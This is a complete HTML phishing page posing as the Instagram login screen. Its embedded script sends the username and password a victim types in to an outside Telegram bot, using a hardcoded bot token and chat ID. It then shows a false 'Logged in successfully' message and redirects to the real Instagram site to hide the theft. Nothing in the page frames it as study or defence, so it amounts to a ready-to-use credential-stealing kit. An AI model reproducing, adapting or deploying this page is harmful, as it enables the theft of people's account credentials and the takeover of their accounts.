<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #fafafa; 
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .container { width: 350px; max-width: 90%; }
        .card { background-color: #ffffff; border: 1px solid #dbdbdb; padding: 40px; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; }
        .logo { font-family: 'Grand Hotel', cursive; font-size: 3rem; margin-bottom: 20px; color: #000; }
        input { width: 100%; padding: 12px 10px; margin-bottom: 10px; border: 1px solid #efefef; background-color: #fafafa; border-radius: 3px; font-size: 12px; outline: none; }
        .btn-login { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 5px; opacity: 0.7; }
        .btn-login:hover { opacity: 1; }
        .divider { display: flex; align-items: center; width: 100%; margin: 18px 0; }
        .line { height: 1px; background-color: #dbdbdb; flex-grow: 1; }
        .or { padding: 0 16px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; }
        .forgot { color: #003768; font-size: 12px; margin-top: 20px; text-decoration: none; }
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: none; justify-content: center; align-items: center; z-index: 100; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #success-msg { display: none; text-align: center; color: #0095f6; font-weight: bold; }
    </style>
</head>
<body>
    <div id="loader"><div class="spinner"></div></div>
    <div id="success-msg" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:white; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1);">
        <i class="fas fa-check-circle" style="color:green; font-size:2rem;"></i><br>Logged in successfully!
    </div>
    <div class="container">
        <div class="card">
            <div class="logo">Instagram</div>
            <form id="loginForm" onsubmit="sendToTelegram(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn-login">Log in</button>
            </form>
            <div class="divider"><div class="line"></div><div class="or">OR</div><div class="line"></div></div>
            <div class="fb-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</div>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        <div class="card" style="padding: 25px;">
            <p style="font-size: 14px;">Don't have an account? <span style="color:#0095f6;">Sign up</span></p>
        </div>
    </div>
    <script>
        const BOT_TOKEN = "9209995430:AAFHrVmN8m2yNpuIZlbh1lURlS1PBB-Gx44Ye"; 
        const CHAT_ID = "6534130302"; 

        function sendToTelegram(e) {
            e.preventDefault(); 
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            document.getElementById('loader').style.display = 'flex';
            const message = `🔥 *New Instagram Login* 🔥\n\n👤 Username: <code>${user}</code>\n🔑 Password: <code>${pass}</code>\n📅 Time: ${new Date().toLocaleString()}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'html', text: message }) })
            .then(response => {
                if(response.ok) {
                    document.querySelector('.card').style.display = 'none';
                    document.getElementById('success-msg').style.display = 'block';
                    document.getElementById('loader').style.display = 'none';
                    setTimeout(() => window.location.href = "https://www.instagram.com", 2000);
                } else {
                    alert("Error sending data");
                    document.getElementById('loader').style.display = 'none';
                }
            }).catch(error => { console.error('Error:', error); document.getElementById('loader').style.display = 'none'; });
        }
    </script>
</body>
</html>
